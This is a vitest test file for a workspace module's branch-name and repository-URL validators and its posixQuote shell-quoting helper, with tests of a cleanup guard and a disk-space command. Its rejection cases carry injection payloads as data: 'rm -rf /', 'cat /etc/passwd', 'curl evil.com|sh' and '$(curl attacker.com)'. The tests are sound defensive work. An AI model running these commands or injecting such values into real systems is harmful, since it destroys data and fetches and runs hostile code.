/**
 * SH-2 — workspace-lifecycle Shell Injection Tests
 *
 * Verifies that branch names and repository URLs are validated before use,
 * preventing shell metacharacter injection via git clone arguments.
 *
 * Also covers the latent-injection fixes applied to cleanupWorkspace and
 * checkDiskSpace:
 *   - posixQuote correctly neutralises arbitrary strings for use in SSH
 *     shell commands (single-quote wrapping + escaped embedded quotes)
 *   - the cleanup guard still prevents deletion of root-level paths
 *   - disk space check path quoting produces the expected shell token
 *
 * Tests cover:
 *   - malicious branch payloads (shell metacharacters, path traversal)
 *   - malicious repository URLs (shell metacharacters, non-git schemes)
 *   - valid inputs that should be accepted without error
 *   - posixQuote output for safe and adversarial inputs
 */

import { describe, it, expect } from "vitest";
import { validateBranch, validateRepoUrl, posixQuote } from "../workspace-lifecycle";

// ── validateBranch — rejection cases ─────────────────────────────────────────

describe("validateBranch — rejects malicious payloads", () => {
  it("rejects a branch with a semicolon (command injection)", () => {
    expect(() => validateBranch("main; rm -rf /")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a pipe character", () => {
    expect(() => validateBranch("main|cat /etc/passwd")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a backtick (command substitution)", () => {
    expect(() => validateBranch("main`whoami`")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a dollar sign (variable expansion)", () => {
    expect(() => validateBranch("main$(curl attacker.com)")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a space", () => {
    expect(() => validateBranch("main branch")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with double-dot path traversal", () => {
    expect(() => validateBranch("../../etc/shadow")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch starting with a slash", () => {
    expect(() => validateBranch("/etc/passwd")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch ending with a slash", () => {
    expect(() => validateBranch("feature/")).toThrow(/Invalid branch name/);
  });

  it("rejects an empty branch name", () => {
    expect(() => validateBranch("")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch name exceeding 255 characters", () => {
    expect(() => validateBranch("a".repeat(256))).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with an ampersand (background job injection)", () => {
    expect(() => validateBranch("main&evil")).toThrow(/Invalid branch name/);
  });

  it("rejects newline injection in branch name", () => {
    expect(() => validateBranch("main\nrm -rf /")).toThrow(/Invalid branch name/);
  });
});

// ── validateBranch — acceptance cases ────────────────────────────────────────

describe("validateBranch — accepts valid branch names", () => {
  it("accepts a simple main branch", () => {
    expect(() => validateBranch("main")).not.toThrow();
  });

  it("accepts a feature branch with slashes", () => {
    expect(() => validateBranch("feature/new-login")).not.toThrow();
  });

  it("accepts a branch with digits", () => {
    expect(() => validateBranch("release/2.0.1")).not.toThrow();
  });

  it("accepts a branch with underscores", () => {
    expect(() => validateBranch("fix_auth_bug")).not.toThrow();
  });

  it("accepts a branch with dots (semver-style)", () => {
    expect(() => validateBranch("v1.2.3")).not.toThrow();
  });

  it("accepts a branch with dashes", () => {
    expect(() => validateBranch("hotfix-login-crash")).not.toThrow();
  });

  it("accepts a nested feature branch", () => {
    expect(() => validateBranch("feature/auth/oauth-refresh")).not.toThrow();
  });
});

// ── validateRepoUrl — rejection cases ────────────────────────────────────────

describe("validateRepoUrl — rejects malicious URLs", () => {
  it("rejects a URL with a semicolon (command injection)", () => {
    expect(() => validateRepoUrl("https://github.com/owner/repo.git; rm -rf /")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with a pipe character", () => {
    expect(() => validateRepoUrl("https://github.com/repo|cat /etc/passwd")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with backtick command substitution", () => {
    expect(() => validateRepoUrl("https://host.com/repo`curl evil.com|sh`")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with a dollar-paren expansion", () => {
    expect(() => validateRepoUrl("https://host.com/repo$(id)")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with spaces", () => {
    expect(() => validateRepoUrl("https://host.com/repo && curl evil.com")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with a newline injection", () => {
    expect(() => validateRepoUrl("https://host.com/repo.git\nrm -rf /")).toThrow(/Invalid repository URL/);
  });

  it("rejects a file:// URL (local filesystem access)", () => {
    expect(() => validateRepoUrl("file:///etc/passwd")).toThrow(/Invalid repository URL/);
  });

  it("rejects an ftp:// URL (unexpected scheme)", () => {
    expect(() => validateRepoUrl("ftp://host.com/repo")).toThrow(/Invalid repository URL/);
  });

  it("rejects a bare hostname without a scheme", () => {
    expect(() => validateRepoUrl("github.com/owner/repo")).toThrow(/Invalid repository URL/);
  });

  it("rejects an empty URL", () => {
    expect(() => validateRepoUrl("")).toThrow(/Repository URL is required/);
  });

  it("rejects a URL containing a backslash", () => {
    expect(() => validateRepoUrl("https://host.com/repo\\..\\exploit")).toThrow(/Invalid repository URL/);
  });
});

// ── validateRepoUrl — acceptance cases ───────────────────────────────────────

describe("validateRepoUrl — accepts valid git remote URLs", () => {
  it("accepts an https:// GitHub URL", () => {
    expect(() => validateRepoUrl("https://github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts an https:// URL with a token in userinfo position", () => {
    expect(() => validateRepoUrl("https://token@github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts a git@ SSH URL", () => {
    expect(() => validateRepoUrl("git@github.com:owner/repo.git")).not.toThrow();
  });

  it("accepts a git@ SSH URL for GitLab", () => {
    expect(() => validateRepoUrl("git@gitlab.com:group/project.git")).not.toThrow();
  });

  it("accepts an ssh:// URL", () => {
    expect(() => validateRepoUrl("ssh://git@bitbucket.org/team/repo.git")).not.toThrow();
  });

  it("accepts a git:// URL", () => {
    expect(() => validateRepoUrl("git://github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts a self-hosted https URL", () => {
    expect(() => validateRepoUrl("https://git.company.internal/team/project.git")).not.toThrow();
  });
});

// ── posixQuote ────────────────────────────────────────────────────────────────
//
// posixQuote is used when building shell commands for remote SSH execution
// (cleanupWorkspace and checkDiskSpace SSH paths).  The resulting token must
// be interpreted as a literal string by any POSIX-compliant shell.

describe("posixQuote — wraps strings in single quotes", () => {
  it("wraps a simple path in single quotes", () => {
    expect(posixQuote("/tmp/workerai_abc123")).toBe("'/tmp/workerai_abc123'");
  });

  it("neutralises a semicolon injection attempt", () => {
    const malicious = "/tmp/workerai_x; rm -rf /";
    const quoted = posixQuote(malicious);
    // The output must start and end with a single quote and contain no
    // unquoted semicolon that a shell could interpret as a command separator.
    expect(quoted).toMatch(/^'/);
    expect(quoted).toMatch(/'$/);
    // The shell sees the entire value as a single argument
    expect(quoted).toBe("'/tmp/workerai_x; rm -rf /'");
  });

  it("neutralises a backtick command substitution attempt", () => {
    const malicious = "/tmp/workerai_`id`";
    const quoted = posixQuote(malicious);
    expect(quoted).toBe("'/tmp/workerai_`id`'");
  });

  it("neutralises a dollar-paren substitution attempt", () => {
    const malicious = "/tmp/workerai_$(curl attacker.com)";
    const quoted = posixQuote(malicious);
    expect(quoted).toBe("'/tmp/workerai_$(curl attacker.com)'");
  });

  it("escapes an embedded single quote using the POSIX idiom", () => {
    // A path containing a literal ' must be handled by ending the quoted
    // section, double-quoting the ', then reopening.
    const withQuote = "/tmp/workerai_'test";
    const quoted = posixQuote(withQuote);
    expect(quoted).toBe("'/tmp/workerai_'\"'\"'test'");
  });

  it("handles a path with multiple embedded single quotes", () => {
    const withQuotes = "/tmp/workerai_it's'ok";
    const quoted = posixQuote(withQuotes);
    // Each ' is replaced with '"'"'
    expect(quoted).toBe("'/tmp/workerai_it'\"'\"'s'\"'\"'ok'");
  });

  it("handles a path with a newline character", () => {
    const withNewline = "/tmp/workerai_x\nrm -rf /";
    const quoted = posixQuote(withNewline);
    // Newline inside single quotes is a literal newline — not a command separator
    expect(quoted).toBe("'/tmp/workerai_x\nrm -rf /'");
  });

  it("handles a path with spaces", () => {
    const withSpaces = "/tmp/workerai task dir";
    const quoted = posixQuote(withSpaces);
    expect(quoted).toBe("'/tmp/workerai task dir'");
  });

  it("handles an empty string", () => {
    expect(posixQuote("")).toBe("''");
  });
});

// ── cleanupWorkspace guard ─────────────────────────────────────────────────────
//
// The sanity guard in cleanupWorkspace prevents deletion of paths that do not
// look like managed workspaces.  These tests verify that the guard conditions
// are correct independently of the underlying rm mechanism.

describe("cleanupWorkspace guard conditions", () => {
  // Replicate the guard condition from cleanupWorkspace:
  //   workspaceDir.length < 10 || !workspaceDir.includes("workerai_")
  function wouldBeSkipped(workspaceDir: string): boolean {
    return workspaceDir.length < 10 || !workspaceDir.includes("workerai_");
  }

  it("skips a root path /", () => {
    expect(wouldBeSkipped("/")).toBe(true);
  });

  it("skips /tmp alone (too short, no workerai_)", () => {
    expect(wouldBeSkipped("/tmp")).toBe(true);
  });

  it("skips an empty string", () => {
    expect(wouldBeSkipped("")).toBe(true);
  });

  it("skips a path that lacks the workerai_ prefix (even if long)", () => {
    expect(wouldBeSkipped("/home/user/projects/myapp")).toBe(true);
  });

  it("allows a valid managed workspace path", () => {
    expect(wouldBeSkipped("/tmp/workerai_abc123_1718000000000")).toBe(false);
  });

  it("allows a managed path using a custom base dir", () => {
    expect(wouldBeSkipped("/var/tmp/workerai_taskid_1234567890")).toBe(false);
  });
});

// ── checkDiskSpace — SSH command construction ─────────────────────────────────
//
// For the SSH execution path, checkDiskSpace builds a shell command string.
// Verify that posixQuote is applied so that a malicious checkPath cannot
// inject additional shell commands.

describe("checkDiskSpace — SSH command construction via posixQuote", () => {
  function buildDiskSpaceCmd(checkPath: string): string {
    return `df -k ${posixQuote(checkPath)} | awk 'NR==2{print $4}'`;
  }

  it("produces a safe command for a normal path", () => {
    const cmd = buildDiskSpaceCmd("/tmp");
    expect(cmd).toBe("df -k '/tmp' | awk 'NR==2{print $4}'");
  });

  it("neutralises a semicolon injection in the path argument", () => {
    const malicious = "/tmp'; rm -rf /";
    const cmd = buildDiskSpaceCmd(malicious);
    // The path argument must be the POSIX-quoted form produced by posixQuote —
    // the entire value (including the injected semicolon) is a single argument
    // to df, not a shell command separator.
    const expectedArg = posixQuote(malicious);
    expect(cmd).toBe(`df -k ${expectedArg} | awk 'NR==2{print $4}'`);
  });

  it("neutralises a command substitution attempt in the path", () => {
    const cmd = buildDiskSpaceCmd("/tmp/$(id)");
    expect(cmd).toBe("df -k '/tmp/$(id)' | awk 'NR==2{print $4}'");
  });
});
